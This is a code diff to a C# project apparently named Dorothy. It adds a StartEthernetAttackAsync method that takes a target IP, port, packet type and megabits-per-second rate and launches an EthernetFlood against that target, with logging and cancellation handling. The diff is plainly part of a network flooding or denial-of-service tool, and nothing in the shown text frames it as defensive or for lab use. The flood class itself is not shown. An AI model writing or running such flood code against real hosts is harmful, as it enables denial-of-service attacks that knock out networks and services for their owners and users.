@@ -513,5 +513,41 @@ namespace Dorothy.Models
                 return string.Empty;
             }
         }
+
+        public async Task StartEthernetAttackAsync(string targetIp, int targetPort, long megabitsPerSecond, EthernetFlood.EthernetPacketType packetType)
+        {
+            if (_isAttackRunning)
+            {
+                _logger.LogWarning("Attack already in progress");
+                return;
+            }
+
+            try
+            {
+                _cancellationSource = new CancellationTokenSource();
+                _isAttackRunning = true;
+
+                await Task.Run(async () =>
+                {
+                    try
+                    {
+                        var packetParams = await CreatePacketParameters(targetIp, targetPort, megabitsPerSecond);
+                        using var flood = new EthernetFlood(packetParams, packetType, _cancellationSource.Token);
+                        await flood.StartAsync();
+                    }
+                    catch (Exception ex)
+                    {
+                        _logger.LogError($"Ethernet attack failed: {ex.Message}");
+                        throw;
+                    }
+                }, _cancellationSource.Token);
+            }
+            catch (Exception ex)
+            {
+                _isAttackRunning = false;
+                _logger.LogError($"Failed to start Ethernet attack: {ex.Message}");
+                await StopAttackAsync();
+            }
+        }
     }
 }
